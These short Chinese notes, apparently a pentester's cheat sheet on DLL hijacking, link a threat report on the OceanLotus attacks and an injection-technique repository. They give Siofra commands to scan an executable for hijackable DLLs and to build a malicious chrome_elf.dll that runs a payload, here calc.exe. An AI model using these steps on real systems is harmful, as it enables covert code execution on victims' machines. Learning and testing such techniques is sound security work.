### 简介

DLL Hijacking

[【微步在线报告】“海莲花”攻击 - 白利用 0检出](https://m.threatbook.cn/detail/1397?from=groupmessage&isappinstalled=0)

### 方式

7种不同的DLL注入方式 [injectAllTheThings](https://github.com/fdiskyou/injectAllTheThings)

[详细解释文章 - 看雪学院](https://mp.weixin.qq.com/s/mNLxblONujByW16r9tC6yQ)

### 测试


使用[siofra](https://github.com/Cybereason/siofra)检测xx.exe的DLL能否被劫持

```
# 文件扫描模式 对父程序xx.exe进行扫描 枚举它所依赖的dll文件 并检测能否DLL Hijacking
Siofra32.exe --mode file-scan -f "c:\Program Files\xxx\xx.exe" --enum-dependency --dll-hijack
# 如结果
# [!] Module chrome_elf.dll vulnerable at C:\ProgramData\xxx\chrome_elf.dll (real path: Unknown)

# Exploit - 生成存在恶意代码chrome_elf.dll 从而实现dll劫持
Siofra32.exe --mode infect -f chrome_elf(real).dll -o chrome_elf.dll --payload-type process --payload-path C:\Windows\System32\calc.exe
```
